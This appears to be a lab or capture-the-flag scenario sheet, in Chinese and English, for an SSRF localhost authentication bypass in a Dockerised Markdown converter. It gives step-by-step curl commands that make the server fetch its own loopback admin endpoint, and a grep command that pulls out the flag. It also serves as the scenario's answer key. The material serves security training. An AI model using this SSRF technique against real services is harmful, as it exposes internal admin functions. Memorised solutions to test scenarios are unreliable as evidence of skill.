# WEB-11: SSRF Localhost Auth Bypass

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-11 |
| 名称 | SSRF Localhost Auth Bypass |
| 技术/CVE | N/A (SSRF misconfiguration) |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10111 |

## 场景概述
- 技术：N/A (SSRF misconfiguration)
- 难度：L2
- 交付方式：docker
- 入口端口：10111
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | SSRF Localhost Bypass |
| Difficulty | L2 |
| Port | 10111 |
| Path | scenarios/web/ssrf-localhost-bypass/ |
| Type | docker |
| Service | Markdown to HTML Converter |

### Attack Path Summary
```
User-supplied URL fetched by server → SSRF → Bypass localhost IP check → Admin endpoint → Flag
```

### Prerequisites

#### Knowledge
- SSRF localhost bypass techniques: Methods to bypass IP-based access controls (127.0.0.1, localhost, 0.0.0.0)
- IP-based access control circumvention: Understanding how applications restrict access based on source IP
- urllib SSRF vulnerabilities: Python urllib library behavior with redirects and internal addresses
- HTTP协议 (HTTP protocol): HTTP request structure, methods, and status codes

#### Tools
- curl: Send HTTP requests to exploit the SSRF vulnerability
- netcat: Network debugging and port testing

### Step-by-Step Exploitation

#### Step 1: Access the Markdown Converter Service

Open the service and observe the URL fetch functionality presented to users.

```bash
curl http://localhost:10111/
```

#### Step 2: Attempt Direct Admin Access

Try to access the admin endpoint directly to confirm it is blocked from external access.

```bash
curl http://localhost:10111/admin
```

#### Step 3: Use Fetch Endpoint to Request Localhost Admin

Leverage the fetch functionality to bypass IP restrictions by making the server request itself on localhost.

```bash
curl "http://localhost:10111/fetch?url=http://127.0.0.1:5000/admin"
```

#### Step 4: Retrieve the Flag via SSRF

Access the admin flag endpoint through the SSRF vulnerability to read the flag.

```bash
curl "http://localhost:10111/fetch?url=http://127.0.0.1:5000/admin/flag"
```

The flag is displayed on the admin page response.

### Flag Location
- `/flag.txt`, displayed on the admin page when accessed via SSRF from localhost

### Verification Commands
```bash
curl -s "http://localhost:10111/fetch?url=http://127.0.0.1:5000/admin/flag" | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | HTTP fetch proxy and localhost-only administration service |
| 侦察与前置条件 | Host parsing, redirect, and localhost trust behavior |
| 核心漏洞与利用 | Bypass SSRF filtering to request the loopback admin endpoint |
| 权限、横向或影响 | Authentication/boundary bypass through server-side request origin |
| 验证 | Use the admin response to obtain the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
